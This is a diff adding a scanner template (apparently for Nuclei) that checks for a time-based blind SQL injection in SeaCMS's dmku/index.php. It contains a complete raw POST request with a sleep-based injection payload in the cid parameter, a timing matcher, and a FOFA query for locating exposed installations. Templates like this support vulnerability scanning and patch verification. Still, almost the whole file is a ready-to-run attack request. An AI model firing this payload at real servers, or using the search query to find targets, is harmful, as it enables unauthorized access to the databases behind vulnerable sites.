@@ -1,0 +1,41 @@
+id: poc-sd9n3o4ficg9onat
+info:
+  name: SeaCMS海洋影视管理系统index.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sd9n3o4ficg9onat
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sd9n3o4ficg9onat
+    fofa: app="海洋CMS"
+http:
+- raw:
+  - 'POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Accept-Ldwk: bG91ZG9uZ3dlbmt1
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 56
+
+
+    cid=(select(1)from(select(sleep(6)))x)&text=1&color=1'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
